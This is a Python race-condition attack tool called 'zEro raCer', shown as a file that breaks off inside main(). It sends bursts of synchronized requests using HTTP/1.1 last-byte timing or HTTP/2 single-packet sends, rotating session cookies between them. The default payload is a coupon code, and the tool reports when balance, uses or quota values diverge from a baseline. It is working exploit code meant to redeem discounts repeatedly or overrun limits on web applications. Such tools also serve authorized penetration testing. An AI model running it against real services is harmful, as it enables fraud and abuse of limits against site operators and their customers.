#!/usr/bin/env python3
# zEro raCer :: by EvNN / saMan
# v5.3 -- bounded decoding and stricter HTTP response framing.
#
# fixes:
#  - RFC 7230: TE overrides CL (prevents HTTP request smuggling parsing bugs)
#  - _h1_read: separate MAX_HEADERS limit, negative CL ignored
#  - _decode_body: strictly bounds flush() output to prevent OOM
#  - canon(): bypasses json.loads for bodies >1MB to save RAM
#  - spa(): t0 moved right before sendall, checks conn.state for reuse
#  - dry-run: validates URL port, headers, and payload encoding
#  - urlencode: uses doseq=True to handle lists/nested dicts in forms

import argparse
import base64
import gzip
import hashlib
import json
import os
import signal
import socket
import ssl
import sys
import threading
import time
import zlib
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlencode

import requests
import h2.config
import h2.connection
import h2.events
from h2.connection import ConnectionState

try:
    import resource
    _HAS_RESOURCE = True
except ImportError:
    _HAS_RESOURCE = False

try:
    import brotli
    _HAS_BR = True
except Exception:
    _HAS_BR = False

__version__ = "5.3"

X = "\033[0m"
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
D = "\033[90m"

MAX_BODY_DEFAULT = 8 * 1024 * 1024
MAX_HEADERS = 65536
R_I, R_ST, R_T, R_LEN, R_BODY, R_CK, R_PK, R_CN, R_FLD, R_COMP = range(10)

DIV_CLEAN = 0
DIV_UNKNOWN = -1
DIV_FAILED = -2

_open = set()
_open_lk = threading.Lock()
_bars = set()
_bars_lk = threading.Lock()

def _track(s):
    with _open_lk: _open.add(s)

def _untrack(s):
    with _open_lk: _open.discard(s)
    try: s.close()
    except Exception: pass

def _track_bar(b):
    with _bars_lk: _bars.add(b)

def _untrack_bar(b):
    with _bars_lk: _bars.discard(b)

def _kill_all():
    with _bars_lk:
        bs = list(_bars); _bars.clear()
    for b in bs:
        try: b.abort()
        except Exception: pass
    with _open_lk:
        xs = list(_open); _open.clear()
    for s in xs:
        try: s.close()
        except Exception: pass

def get_args():
    p = argparse.ArgumentParser(description="zEro raCer")
    p.add_argument("-u", required=True, help="target url")
    p.add_argument("-c", default="", help="cookie string")
    p.add_argument("-C", default="", help="cookie file")
    p.add_argument("-X", default="POST", help="HTTP method")
    p.add_argument("-d", default='{"code":"OFF50"}', help="json payload")
    p.add_argument("-f", default="", help="payload file")
    p.add_argument("-H", action="append", default=[], help="custom header")
    p.add_argument("-n", type=int, default=50, help="threads")
    p.add_argument("-r", type=int, default=10, help="rounds")
    p.add_argument("-t", type=float, default=10.0, help="timeout")
    p.add_argument("--spa", action="store_true", help="http/2 single packet")
    p.add_argument("--h2c", action="store_true", help="plaintext h2")
    p.add_argument("--keepalive", action="store_true", help="reuse connections")
    p.add_argument("--pair", action="store_true", help="split cookies")
    p.add_argument("--proxy", default="", help="proxy url")
    p.add_argument("--proxy-auth", default="", help="user:pass")
    p.add_argument("--insecure", action="store_true", help="skip tls verify")
    p.add_argument("--dump-dir", default="", help="save responses here")
    p.add_argument("--json", action="store_true", help="json output")
    p.add_argument("--stop-on-win", action="store_true", help="stop on divergence")
    p.add_argument("--max-body", type=int, default=MAX_BODY_DEFAULT, help="max body size")
    p.add_argument("--field", action="append", default=[], help="extra json field")
    p.add_argument("--dry-run", action="store_true", help="validate only, no network")
    p.add_argument("--version", action="version", version=__version__)
    return p.parse_args()

def bump_ulimit(n):
    if not _HAS_RESOURCE: return
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        want = n * 4 + 256
        if soft < want:
            resource.setrlimit(resource.RLIMIT_NOFILE, (min(hard, want), hard))
    except Exception:
        pass

def _tls_ctx(insecure):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _sock_opts(s):
    try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception: pass
    busy = getattr(socket, "SO_BUSY_POLL", None)
    if busy is not None:
        try: s.setsockopt(socket.SOL_SOCKET, busy, 50 * 1000)
        except Exception: pass

def load_cks(a):
    if a.C:
        try:
            fh = open(a.C)
        except OSError as e:
            sys.exit(f"{R}[!] -C {a.C}: {e}{X}")
        out = []
        with fh:
            for ln in fh:
                ln = ln.strip()
                if ln.lower().startswith("cookie:"):
                    ln = ln.split(":", 1)[1].strip()
                if ln: out.append(ln)
        return out or [""]
    return [a.c] if a.c else [""]

def load_payloads(a):
    if a.f:
        try:
            fh = open(a.f)
        except OSError as e:
            sys.exit(f"{R}[!] -f {a.f}: {e}{X}")
        out = []
        with fh:
            for i, ln in enumerate(fh, 1):
                ln = ln.strip()
                if not ln: continue
                try:
                    out.append(json.loads(ln))
                except Exception as e:
                    print(f"{Y}[!] {a.f}:{i} bad json ({e}), skipped: {ln[:50]}{X}")
        if not out:
            sys.exit(f"{R}[!] {a.f} had no valid json lines{X}")
        return out
    try:
        return [json.loads(a.d)]
    except Exception as e:
        sys.exit(f"{R}[!] -d is not valid json: {e}{X}")

def _pkey(p):
    return json.dumps(p, sort_keys=True)

def build_hdrs(a, ck):
    h = {"User-Agent": f"zEro-raCer/{__version__}", "Content-Type": "application/json"}
    if ck: h["Cookie"] = ck
    for x in a.H:
        k, _, v = x.partition(":")
        k = k.strip(); v = v.strip()
        if not k: continue
        if "\r" in k or "\n" in k or "\r" in v or "\n" in v:
            sys.exit(f"{R}[!] CRLF injection detected in header: {x}{X}")
        # strict header name check (RFC 7230)
        if not all(c.isalnum() or c in "!#$%&'*+-.^_`|~" for c in k):
            sys.exit(f"{R}[!] invalid header name: {k}{X}")
        for ex in list(h):
            if ex.lower() == k.lower():
                h[ex] = v
                break
        else:
            h[k] = v
    return h

def encode_body(a, payload):
    h = build_hdrs(a, "")
    ctype = h.get("Content-Type", "application/json").lower()
    if "form-urlencoded" in ctype:
        return urlencode(payload, doseq=True).encode()
    elif "json" in ctype:
        return json.dumps(payload).encode()
    return json.dumps(payload).encode()

def _pop_host_ci(hdrs, default):
    for k in list(hdrs):
        if k.lower() == "host":
            return hdrs.pop(k)
    return default

def _split_url(u):
    if "://" not in u: u = "http://" + u
    p = urlparse(u)
    if p.scheme.lower() not in ("http", "https"):
        raise ValueError("invalid scheme: must be http or https")
    if not p.hostname: raise ValueError("bad url: no hostname")
    try: port = p.port
    except ValueError: 
        raise ValueError("invalid port in url")
    path = p.path or "/"
    if p.query: path += "?" + p.query
    return p.hostname, port, path

def _is_tls(u):
    return urlparse(u).scheme.lower() == "https"

def _port_or(port, tls):
    return port if port else (443 if tls else 80)

def _hp_str(host, port):
    return ("[%s]:%d" % (host, port)) if ":" in host else ("%s:%d" % (host, port))

def _host_hdr(host, port, scheme):
    default = 443 if scheme == "https" else 80
    if port is None or port == default:
        return ("[%s]" % host) if ":" in host else host
    return _hp_str(host, port)

def _prepare_get_path(o, payload):
    try:
        req = requests.Request('GET', o.u, params=payload).prepare()
        p = urlparse(req.url)
        return p.path + ("?" + p.query if p.query else "")
    except Exception:
        p = urlparse(o.u)
        return p.path + ("?" + p.query if p.query else "") or "/"

def pick_cookie(a, ckl, i):
    if not ckl: return ""
    if a.pair and len(ckl) >= 2:
        return ckl[i % len(ckl)] # round-robin all cookies
    return ckl[i % len(ckl)]

def _via_proxy(a, host, port):
    if not a.proxy: return socket.create_connection((host, port), timeout=a.t)
    p = a.proxy if "://" in a.proxy else "http://" + a.proxy
    u = urlparse(p)
    ph = u.hostname or ""
    pport = u.port or (443 if u.scheme == "https" else 8080)
    is_tls = (u.scheme.lower() == "https")
    if not ph: raise Exception("bad proxy")

    s = socket.create_connection((ph, pport), timeout=a.t)
    try:
        if is_tls: s = _tls_ctx(a.insecure).wrap_socket(s, server_hostname=ph)
        target = _hp_str(host, port)
        lines = [f"CONNECT {target} HTTP/1.1", f"Host: {target}", "Proxy-Connection: keep-alive"]
        if a.proxy_auth:
            cred = base64.b64encode(a.proxy_auth.encode()).decode()
            lines.append(f"Proxy-Authorization: Basic {cred}")
        s.sendall(("\r\n".join(lines) + "\r\n\r\n").encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = s.recv(4096)
            if not c: raise Exception("proxy closed on CONNECT")
            buf += c
        head = buf.split(b"\r\n", 1)[0].split(b" ")
        if len(head) < 2 or not head[1].isdigit():
            raise Exception("bad proxy status: %r" % head[:80])
        if int(head[1]) != 200: raise Exception("CONNECT refused: %d" % int(head[1]))
    except Exception:
        try: s.close()
        except: pass
        raise
    return s

def _decode_body(data, hdrs, max_body):
    """Decode supported content encodings without allowing unbounded output."""
    ce = (hdrs.get("content-encoding") or "").lower().strip()
    if not ce or ce == "identity":
        return data[:max_body], len(data) <= max_body

    encodings = [e.strip() for e in ce.split(",") if e.strip()]
    if not encodings:
        return data[:max_body], len(data) <= max_body

    # brotli's common Python API has no output-size limit. Do not call process()
    # on untrusted compressed bytes because a tiny response can expand massively.
    if any(enc == "br" for enc in encodings):
        return data[:max_body], False

    for enc in reversed(encodings):
        if enc == "gzip":
            wbits = 16 + zlib.MAX_WBITS
        elif enc == "deflate":
            wbits = zlib.MAX_WBITS
        else:
            return data[:max_body], False

        try:
            dec = zlib.decompressobj(wbits)
            out = bytearray()
            pos = 0
            truncated = False
            chunk_size = 1024
            while pos < len(data):
                pending = data[pos:pos + chunk_size]
                pos += len(pending)
                while pending:
                    # Ask for one byte beyond the limit so overflow is detected,
                    # but never retain more than max_body + 1 bytes.
                    limit = max(1, max_body + 1 - len(out))
                    piece = dec.decompress(pending, limit)
                    out.extend(piece)
                    if len(out) > max_body:
                        truncated = True
                        break
                    next_pending = dec.unconsumed_tail
                    if next_pending == pending and not piece:
                        truncated = True
                        break
                    pending = next_pending
                if truncated:
                    break

            if not truncated and not dec.eof:
                # A response ending before the compression stream does is partial.
                truncated = True
            data = bytes(out[:max_body])
            if truncated:
                return data, False
        except Exception:
            return bytes(out[:max_body]) if 'out' in locals() else b"", False

    return data[:max_body], True

INTERESTING = ("balance", "uses_left", "remaining", "count", "success",
               "message", "error", "uses", "quota", "stock", "available")
_EXTRA_FIELDS = []

def _all_field_names():
    return list(INTERESTING) + list(_EXTRA_FIELDS)

def canon(txt):
    # avoid expensive json parsing for huge bodies to save memory
    if len(txt) < 1024 * 1024:
        try:
            s = json.dumps(json.loads(txt), sort_keys=True)
            return hashlib.sha256(s.encode('utf-8')).hexdigest()
        except:
            pass
    return hashlib.sha256(txt.strip().encode('utf-8')).hexdigest()

def interesting_fields(txt):
    out = {}
    try:
        j = json.loads(txt)
        if isinstance(j, dict):
            for k in _all_field_names():
                if k in j: out[k] = j[k]
    except: pass
    return out

def _ok_status(st):
    return type(st) is int and 200 <= st < 300

def _bad_status(st):
    return type(st) is int and not _ok_status(st)

def do_req(o, ck, payload):
    h = build_hdrs(o, ck)
    px = {"http": o.proxy, "https": o.proxy} if o.proxy else None
    kw = dict(headers=h, timeout=o.t, proxies=px, verify=not o.insecure, allow_redirects=False)
    if o.X.upper() == "GET": return requests.get(o.u, params=payload, **kw)
    
    body = encode_body(o, payload)
    return requests.request(o.X, o.u, headers=h, data=body, timeout=o.t, proxies=px, verify=not o.insecure, allow_redirects=False)

def grab_baseline(o, ckl, payload):
    try:
        r = do_req(o, ckl[0], payload)
        return {"status": r.status_code, "body": r.text[:300], "canon": canon(r.text)}
    except Exception as e:
        return {"status": 0, "body": "", "canon": "", "err": str(e)[:60]}


# --- h1 last-byte ---
def _h1_sock(o):
    host, uport, _ = _split_url(o.u)
    tls = _is_tls(o.u)
    raw = _via_proxy(o, host, _port_or(uport, tls))
    try:
        _sock_opts(raw)
        if tls:
            ctx = _tls_ctx(o.insecure)
            ctx.set_alpn_protocols(["http/1.1"])
            s = ctx.wrap_socket(raw, server_hostname=host)
        else: s = raw
        _track(s)
        return s
    except Exception:
        try: raw.close()
        except: pass
        raise

def _h1_req(o, ck, payload, keepalive=False):
    host, uport, _ = _split_url(o.u)
    tls = _is_tls(o.u)
    hdrs = build_hdrs(o, ck)
    hosthdr = _pop_host_ci(hdrs, _host_hdr(host, _port_or(uport, tls), "https" if tls else "http"))

    body = b""
    if o.X.upper() == "GET":
        path = _prepare_get_path(o, payload)
    else:
        body = encode_body(o, payload)
        path = urlparse(o.u).path or "/"
        if urlparse(o.u).query: path += "?" + urlparse(o.u).query

    lines = [f"{o.X.upper()} {path} HTTP/1.1", f"Host: {hosthdr}"]
    for k, v in hdrs.items():
        if k.lower() not in ("host", "connection", "content-length"):
            lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
    lines.append(f"Connection: {'keep-alive' if keepalive else 'close'}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body

def _parse_chunked(data):
    body = bytearray()
    i = 0
    while True:
        j = data.find(b"\r\n", i)
        if j < 0: return bytes(body), False
        try:
            size = int(data[i:j].split(b";")[0].strip(), 16)
        except ValueError:
            return bytes(body), False
        if size < 0: return bytes(body), False
        i = j + 2
        
        if size == 0:
            while True:
                j = data.find(b"\r\n", i)
                if j < 0: return bytes(body), False
                if j == i:
                    return bytes(body), True
                i = j + 2
        
        end = i + size
        if len(data) < end + 2: return bytes(body), False
        if data[end:end+2] != b"\r\n": return bytes(body), False
        body.extend(data[i:end])
        i = end + 2

def _h1_read(s, timeout, t0, max_body, method):
    deadline = t0 + timeout
    buf = b""; head_end = -1; cl = None; chunked = False; hdrs = {}
    conn_close = False; eof = False
    code = 0

    while True:
        rem = deadline - time.perf_counter()
        if rem <= 0: break
        s.settimeout(rem)
        try: chunk = s.recv(65535)
        except socket.timeout: break
        except Exception: break
        if not chunk:
            eof = True
            break

        if len(buf) + len(chunk) > max_body + MAX_HEADERS:
            allowed = max_body + MAX_HEADERS - len(buf)
            if allowed > 0: buf += chunk[:allowed]
            break
        buf += chunk

        if head_end < 0:
            pos = buf.find(b"\r\n\r\n")
            if pos < 0:
                if len(buf) > MAX_HEADERS: break
                continue
            head_end = pos + 4
            malformed_headers = False
            for ln in buf[:pos].split(b"\r\n")[1:]:
                if not ln or b":" not in ln:
                    malformed_headers = True
                    break
                k, _, v = ln.partition(b":")
                if not k.strip() or any(ch <= 32 or ch >= 127 for ch in k.strip()):
                    malformed_headers = True
                    break
                kl = k.strip().lower().decode("latin-1", "replace")
                # Preserve duplicates so framing headers can be validated below.
                value = v.strip().decode("latin-1", "replace")
                if kl in hdrs:
                    hdrs[kl] += ", " + value
                else:
                    hdrs[kl] = value

            parts = buf[:pos].split(b" ")
            if len(parts) >= 2 and parts[1].isdigit():
                code = int(parts[1])

            if malformed_headers or code == 0:
                return time.perf_counter() - t0, code, "", False, True

            if 100 <= code < 200:
                if code == 101:
                    return time.perf_counter() - t0, code, "", False, True
                buf = buf[head_end:]
                head_end = -1
                hdrs = {}
                continue

            if method == "HEAD" or code in (204, 304):
                return time.perf_counter() - t0, code, "", True, ("close" in hdrs.get("connection", "").lower())

            # Transfer-Encoding takes precedence over Content-Length. Only accept
            # a supported final chunked coding; ambiguous framing is rejected.
            if "transfer-encoding" in hdrs:
                te = [x.strip().lower() for x in hdrs["transfer-encoding"].split(",") if x.strip()]
                if te != ["chunked"]:
                    return time.perf_counter() - t0, code, "", False, True
                chunked = True
                cl = None
            elif "content-length" in hdrs:
                raw_cls = [x.strip() for x in hdrs["content-length"].split(",")]
                try:
                    cls = [int(x, 10) for x in raw_cls]
                    if not cls or any(x < 0 for x in cls) or len(set(cls)) != 1:
                        return time.perf_counter() - t0, code, "", False, True
                    cl = cls[0]
                except (ValueError, TypeError):
                    return time.perf_counter() - t0, code, "", False, True

            if "close" in hdrs.get("connection", "").lower(): conn_close = True

        rest = buf[head_end:] if head_end > 0 else b""
        if chunked and _parse_chunked(rest)[1]: break
        elif cl is not None and len(rest) >= cl: break
        if len(buf) >= max_body + MAX_HEADERS: break

    body = b""; complete = False
    if head_end > 0:
        raw = buf[head_end:]
        if chunked:
            body, complete = _parse_chunked(raw)
        elif cl is not None:
            body = raw[:cl]
            complete = len(raw) >= cl
        else:
            body = raw
            complete = eof
        
        body, dec_ok = _decode_body(body, hdrs, max_body)
        if not dec_ok: complete = False

    return time.perf_counter() - t0, code, body.decode("utf-8", "replace"), complete, conn_close


class H1Worker:
    def __init__(self, ck, o):
        self.ck = ck; self.o = o; self.sock = None
    def ensure(self):
        if self.sock is None: self.sock = _h1_sock(self.o)
    def close(self):
        if self.sock:
            _untrack(self.sock); self.sock = None

def h1_lastbyte(o, res, lk, ckl, payload, rnd):
    pk = _pkey(payload)
    if o.keepalive:
        if not hasattr(o, "_h1_workers"):
            o._h1_workers = [H1Worker(pick_cookie(o, ckl, i), o) for i in range(o.n)]
        slots = [(w, w.ck) for w in o._h1_workers]
    else:
        slots = []
        for i in range(o.n):
            ck = pick_cookie(o, ckl, i)
            s = None
            try:
                s = _h1_sock(o)
                req = _h1_req(o, ck, payload)
                slots.append(((s, req, None), ck))
            except Exception as e:
                if s is not None: _untrack(s)
                slots.append(((None, b"", str(e)[:40]), ck))

    bar = threading.Barrier(o.n)
    _track_bar(bar)
    out = [None] * o.n

    def worker(i):
        slot, ck = slots[i]
        s = None; err = None; req = b""
        if o.keepalive:
            w = slot
            try:
                w.ensure(); s = w.sock
                req = _h1_req(o, ck, payload, keepalive=True)
                s.sendall(req[:-1])
            except Exception as e:
                err = str(e)[:40]
                try: slot.close()
                except Exception: pass
        else:
            s, req, err = slot
            if s and not err:
                try: s.sendall(req[:-1])
                except Exception as e: err = str(e)[:40]

        try: bar.wait(timeout=o.t + 5)
        except: pass

        if err:
            out[i] = (i, "ERR", 0, 0, err, ck, pk, "", {}, False)
            if not o.keepalive and s is not None:
                _untrack(s)
            return

        t0 = time.perf_counter()
        try:
            s.sendall(req[-1:])
            dt, code, txt, complete, conn_close = _h1_read(s, o.t, t0, o.max_body, o.X.upper())
            if o.keepalive and (code == 0 or not complete or conn_close):
                slot.close()
            if code == 0:
                out[i] = (i, "ERR", dt, 0, "no status", ck, pk, "", {}, False)
                return
            
            cn = canon(txt)
            body_keep = txt[:300]
            if o.dump_dir:
                fn = os.path.join(o.dump_dir, f"r{rnd:02d}_s{i}.json")
                with open(fn, "w") as f:
                    json.dump({"status": code, "body": txt, "complete": complete}, f)
                body_keep = f"-> {fn}"

            out[i] = (i, code, dt, len(txt), body_keep, ck, pk,
                      cn, interesting_fields(txt), complete)
        except Exception as e:
            if o.keepalive: slot.close()
            out[i] = (i, "ERR", 0, 0, str(e)[:40], ck, pk, "", {}, False)
        finally:
            if not o.keepalive and s: _untrack(s)

    try:
        with ThreadPoolExecutor(max_workers=o.n) as ex:
            list(ex.map(worker, range(o.n)))
    finally:
        _untrack_bar(bar)
    with lk: res.extend([r for r in out if r])


# --- h2 single packet ---
_ka_h2 = {"sock": None, "conn": None, "host": None, "port": None}

def spa(o, res, lk, ckl, payload, rnd):
    pk = _pkey(payload)
    host, uport, path = _split_url(o.u)
    tls = not o.h2c
    port = _port_or(uport, tls)
    default_auth = _host_hdr(host, port, "https" if tls else "http")

    if o.X.upper() == "GET":
        path = _prepare_get_path(o, payload)

    reuse = False
    if (o.keepalive and _ka_h2["sock"] is not None
            and _ka_h2["host"] == host and _ka_h2["port"] == port):
        try: 
            if _ka_h2["conn"].state != ConnectionState.CLOSED:
                reuse = _ka_h2["sock"].fileno() != -1
        except: 
            reuse = False

    t0 = None
    healthy = True
    had_pending = False
    err_msg = "pending timeout"
    
    sock = None
    try:
        if reuse:
            sock, conn = _ka_h2["sock"], _ka_h2["conn"]
        else:
            if _ka_h2["sock"] is not None:
                try: _untrack(_ka_h2["sock"])
                except: pass
                _ka_h2.update({"sock": None, "conn": None, "host": None, "port": None})

            raw = _via_proxy(o, host, port)
            try:
                _sock_opts(raw)
                if o.h2c: sock = raw
                else:
                    ctx = _tls_ctx(o.insecure); ctx.set_alpn_protocols(["h2"])
                    try: sock = ctx.wrap_socket(raw, server_hostname=host)
                    except Exception:
                        try: raw.close()
                        except: pass
                        raise
                    negotiated = sock.selected_alpn_protocol()
                    if negotiated != "h2":
                        try: sock.close()
                        except: pass
                        raise Exception("server did not negotiate h2 (got %r). --spa needs http/2." % negotiated)
                _track(sock)
            except Exception as e:
                try: raw.close()
                except: pass
                raise

            try:
                conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
                conn.local_settings.initial_window_size = 1048576
                conn.initiate_connection()
                sock.sendall(conn.data_to_send())
                sock.settimeout(0.5)
                d = sock.recv(65535)
                if d:
                    conn.receive_data(d)
                    out_b = conn.data_to_send()
                    if out_b: sock.sendall(out_b)
            except Exception as e:
                healthy = False
                err_msg = "setup:" + str(e)[:20]
                raise

        body = b"" if o.X.upper() == "GET" else encode_body(o, payload)
        streams = {}; pending = []
        for i in range(o.n):
            ck = pick_cookie(o, ckl, i)
            hdrs = build_hdrs(o, ck)
            auth = _pop_host_ci(hdrs, default_auth)
            hs = [(":method", o.X.upper()), (":authority", auth),
                  (":scheme", "https" if tls else "http"), (":path", path)]
            hs.extend([(k.lower(), v) for k, v in hdrs.items()
                       if k.lower() not in ("host", "connection", "content-length")])
            if body: hs.append(("content-length", str(len(body))))
            sid = conn.get_next_available_stream_id()
            pending.append(sid)
            streams[sid] = {"buf": bytearray(), "hdr": {}, "ck": ck, "trunc": False}
            conn.send_headers(sid, hs, end_stream=not body)
            if body: conn.send_data(sid, body, end_stream=True)

        t0 = time.perf_counter()
        sock.sendall(conn.data_to_send())
        sock.settimeout(o.t)

        while pending:
            try:
                data = sock.recv(65535)
            except Exception as e:
                healthy = False; err_msg = str(e)[:30]; break
            if not data:
                healthy = False; err_msg = "conn closed"; break
            try:
                events = conn.receive_data(data)
            except Exception as e:
                healthy = False; err_msg = str(e)[:30]; break

            for ev in events:
                sid = getattr(ev, "stream_id", None)
                if isinstance(ev, h2.events.ResponseReceived):
                    streams[sid]["hdr"] = {k.decode("latin-1").lower(): v.decode("latin-1") for k, v in ev.headers}
                elif isinstance(ev, h2.events.DataReceived):
                    buf = streams[sid]["buf"]
                    room = o.max_body - len(buf)
                    if room > 0:
                        buf.extend(ev.data[:room])
                        if len(ev.data) > room: streams[sid]["trunc"] = True
                    else:
                        streams[sid]["trunc"] = True
                    conn.acknowledge_received_data(ev.flow_controlled_length, sid)
                elif isinstance(ev, h2.events.StreamEnded) and sid in pending:
                    pending.remove(sid)
                    dt = time.perf_counter() - t0
                    hdrs = streams[sid]["hdr"]
                    raw_body, dec_ok = _decode_body(bytes(streams[sid]["buf"]), hdrs, o.max_body)
                    txt = raw_body.decode("utf-8", "replace")
                    if len(raw_body) > o.max_body: streams[sid]["trunc"] = True
                    ck = streams[sid]["ck"]
                    
                    cn = canon(txt)
                    body_keep = txt[:300]
                    comp = not streams[sid]["trunc"] and dec_ok
                    
                    if o.dump_dir:
                        fn = os.path.join(o.dump_dir, f"r{rnd:02d}_s{sid}.json")
                        with open(fn, "w") as f:
                            json.dump({"status": int(hdrs.get(":status", 0)), "body": txt, "complete": comp}, f)
                        body_keep = f"-> {fn}"

                    with lk:
                        res.append((sid, int(hdrs.get(":status", 0)), dt, len(txt),
                                    body_keep, ck, pk, cn, interesting_fields(txt), comp))
                elif isinstance(ev, h2.events.StreamReset) and sid in pending:
                    pending.remove(sid)
                    with lk:
                        res.append((sid, "ERR", 0.0, 0, "rst:%d" % ev.error_code,
                                    streams[sid]["ck"], pk, "", {}, True))
                elif isinstance(ev, h2.events.ConnectionTerminated):
                    healthy = False; err_msg = "goaway:%d" % ev.error_code
                    for psid in list(pending):
                        with lk:
                            res.append((psid, "ERR", 0.0, 0, err_msg,
                                        streams[psid]["ck"], pk, "", {}, True))
                    pending.clear(); break

            out_b = conn.data_to_send()
            if out_b:
                try: sock.sendall(out_b)
                except Exception as e:
                    healthy = False; err_msg = str(e)[:30]; break

        had_pending = bool(pending)
        for psid in list(pending):
            with lk:
                res.append((psid, "ERR", 0.0, 0, err_msg, streams[psid]["ck"], pk, "", {}, False))
        pending.clear()
    finally:
        if sock is not None:
            ok = healthy and not had_pending
            if not ok:
                if reuse:
                    _ka_h2.update({"sock": None, "conn": None, "host": None, "port": None})
                _untrack(sock)
            else:
                if o.keepalive:
                    if not reuse:
                        _ka_h2.update({"sock": sock, "conn": conn, "host": host, "port": port})
                else:
                    _untrack(sock)
    return (time.perf_counter() - t0) if t0 else 0.0


# --- reporting ---
def summarize(round_res, baseline):
    ok = [r for r in round_res if _ok_status(r[R_ST]) and r[R_COMP]]
    partial = [r for r in round_res if _ok_status(r[R_ST]) and not r[R_COMP]]
    bad = [r for r in round_res if _bad_status(r[R_ST])]
    err = [r for r in round_res if r[R_ST] == "ERR"]

    if not ok:
        div = DIV_FAILED
    elif not _ok_status(baseline.get("status")) or not baseline.get("canon"):
        div = DIV_UNKNOWN
    else:
        div = sum(1 for r in ok if r[R_CN] != baseline["canon"] or r[R_ST] != baseline["status"])

    return {"ok": len(ok), "partial": len(partial), "bad": len(bad),
            "err": len(err), "div": div, "total": len(round_res)}

def report(all_res, baselines, payloads, a, rounds_info):
    ok = [r for r in all_res if _ok_status(r[R_ST]) and r[R_COMP]]
    partial = [r for r in all_res if _ok_status(r[R_ST]) and not r[R_COMP]]
    bad = [r for r in all_res if _bad_status(r[R_ST])]
    err = [r for r in all_res if r[R_ST] == "ERR"]
    st_counts = Counter(r[R_ST] for r in bad)

    div_samples = []
    for r in ok:
        bl = baselines.get(r[R_PK], {})
        if not _ok_status(bl.get("status")) or not bl.get("canon"):
            continue
        if r[R_CN] != bl["canon"] or r[R_ST] != bl["status"]:
            div_samples.append(r)

    field_vals = defaultdict(Counter)
    for r in ok:
        for k, v in (r[R_FLD] or {}).items():
            try: field_vals[k][json.dumps(v, sort_keys=True)] += 1
            except: field_vals[k][str(v)] += 1
    multi_fields = {k: v for k, v in field_vals.items() if len(v) > 1}

    rc = 0
    if div_samples:
        rc = 1
    elif not ok:
        rc = 3
    elif any(not _ok_status(baselines.get(_pkey(p), {}).get("status")) for p in payloads):
        rc = 2

    if a.json:
        out = {"total": len(all_res), "ok": len(ok), "partial": len(partial),
               "bad": len(bad), "err": len(err), "divergent": len(div_samples),
               "status_counts": dict(st_counts),
               "field_values": {k: dict(v) for k, v in multi_fields.items()},
               "errors": [{"id": r[R_I], "err": r[R_BODY]} for r in err[:10]],
               "rounds": rounds_info}
        print(json.dumps(out, indent=2))
        return rc

    print(f"\n{D}--------------------------------------------------{X}")
    print(f" {D}FINAL REPORT{X}")
    print(f"{D}--------------------------------------------------{X}")
    print(f" Total Requests : {len(all_res)}")
    print(f" Valid (2xx)    : {len(ok)}")
    if partial: print(f" {Y}Partial (2xx but truncated){X}: {len(partial)}")
    print(f" Errors         : {len(err)}")
    if bad: print(f" Bad Status     : {len(bad)} {dict(st_counts)}")
    print(f" Divergences    : {R if div_samples else G}{len(div_samples)}{X}")
    print(f"{D}--------------------------------------------------{X}")

    if div_samples:
        print(f" Verdict        : {R}DIVERGENCE DETECTED{X}")
        print(f" {D}-> {len(div_samples)} responses differed. verify manually.{X}")
        print(f"\n{D}-> Top divergent bodies:{X}")
        dgrp = defaultdict(list)
        for r in div_samples: dgrp[r[R_CN]].append(r[R_BODY])
        for cn, bodies in sorted(dgrp.items(), key=lambda x: -len(x[1]))[:3]:
            print(f"    x{len(bodies):<3} | {bodies[0][:90]}")
    elif rc == 3:
        print(f" Verdict        : {R}FAILED (no usable 2xx responses){X}")
    elif rc == 2:
        print(f" Verdict        : {Y}UNKNOWN (no valid baseline for some payloads){X}")
    else:
        print(f" Verdict        : {G}NO DIVERGENCE OBSERVED{X}")

    if multi_fields:
        print(f"\n{Y}[*] fields with >1 value (informational, not counted):{X}")
        for k, v in multi_fields.items():
            print(f"    {k}: {dict(v)}")

    print(f"{D}--------------------------------------------------{X}\n")
    return rc

def main():
    a = get_args()
    if "://" not in a.u: a.u = "http://" + a.u

    if a.n < 1: sys.exit(f"{R}[!] -n must be >= 1{X}")
    if a.r < 1: sys.exit(f"{R}[!] -r must be >= 1{X}")
    if a.t <= 0: sys.exit(f"{R}[!] -t must be > 0{X}")
    if a.max_body < 1024: sys.exit(f"{R}[!] --max-body must be >= 1024{X}")
    if a.spa and a.u.startswith("http://") and not a.h2c:
        print(f"{Y}[!] --spa with http:// implies --h2c{X}")
        a.h2c = True

    if a.h2c and _is_tls(a.u):
        sys.exit(f"{R}[!] --h2c with https:// url doesn't make sense{X}")
    if a.field: _EXTRA_FIELDS.extend(a.field)

    ckl = load_cks(a)
    payloads = load_payloads(a)

    # dry-run validation of everything
    try:
        _split_url(a.u)
        build_hdrs(a, "")
        for p in payloads:
            encode_body(a, p)
    except Exception as e:
        sys.exit(f"{R}[!] validation failed: {e}{X}")

    if a.dump_dir:
        os.makedirs(a.dump_dir, exist_ok=True)

    if a.dry_run:
        print(f"{G}[*] dry-run only, inputs validated. exiting.{X}")
        return 0

    bump_ulimit(a.n)
    
    if a.pair and len(ckl) < 2:
        print(f"{Y}[!] --pair needs >=2 cookies in -C, falling back{X}")

    print(f"{D}[*] zEro raCer :: EvNN / saMan v{__version__}{X}")
    print(f"{D}[*] Target:{X} {a.u}")
    print(f"{D}[*] Mode:{X} {'h2 single-packet' if a.spa else 'h1 last-byte'}"
          f" | {D}Threads:{X} {a.n} | {D}Rounds:{X} {a.r}\n")

    baselines = {}
    for p in payloads:
        bl = grab_baseline(a, ckl, p)
        baselines[_pkey(p)] = bl
        if _ok_status(bl["status"]):
            print(f"{D}[*] Fetching baseline...{X}")
            print(f"    Baseline -> {bl['status']} | "
                  f"{D}{bl['body'][:80].replace(chr(10), ' ')}{X}\n")
        else:
            print(f"{Y}[!] baseline failed for {_pkey(p)[:40]}: "
                  f"status={bl['status']} {bl.get('err','')[:60]}{X}")

    def bail(signum, frame):
        _kill_all()
        sys.exit(128 + signum)
